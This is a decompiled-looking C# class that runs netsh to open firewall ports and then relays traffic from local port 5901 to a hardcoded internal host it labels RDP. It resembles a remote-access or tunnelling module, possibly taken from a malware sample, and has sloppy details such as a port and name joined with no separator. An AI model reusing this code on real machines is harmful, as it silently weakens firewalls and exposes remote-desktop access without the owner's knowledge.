using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

public class GClass57
{
	public static void smethod_0(int port, bool tcp, bool udp, string name)
	{
		if (tcp)
		{
			Process.Start("netsh.exe", "firewall add  portopening TCP " + port + name);
		}
		if (udp)
		{
			Process.Start("netsh.exe", "firewall add  portopening UDP " + port + name);
		}
	}

	public static void smethod_1()
	{
		int port = 5901;
		int port2 = 5901;
		int num = 65536;
		try
		{
			string ipString;
			using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
			{
				socket.Connect("8.8.8.8", 65530);
				ipString = (socket.LocalEndPoint as IPEndPoint).Address.ToString();
			}
			Console.WriteLine("Starting up...");
			IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(ipString), port2);
			IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("192.168.1.90"), port);
			Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			Console.WriteLine("Listening for connection ...");
			socket3.Bind(localEP);
			socket3.Listen(1);
			Socket socket4 = socket3.Accept();
			socket2.Connect(remoteEP);
			byte[] array = null;
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			int num5 = 0;
			while (true)
			{
				array = new byte[num];
				num5 = socket4.Receive(array, num, SocketFlags.None);
				Console.WriteLine("Received {0} bytes from redir port. Sennding to RDP port.", num5);
				num2 = socket2.Send(array, num5, SocketFlags.None);
				Console.WriteLine("Sent {0} bytes to RDP. Waiting for response...", num2);
				array = null;
				array = new byte[num];
				num3 = socket2.Receive(array, num, SocketFlags.None);
				Console.WriteLine("Received {0} bytes from RDP. Sending to redir port", num3);
				num4 = socket4.Send(array, num3, SocketFlags.None);
				Console.WriteLine("Sent {0} bytes to redirPort.  Waiting for response...", num4);
				array = null;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception: " + ex.Message);
		}
	}
}
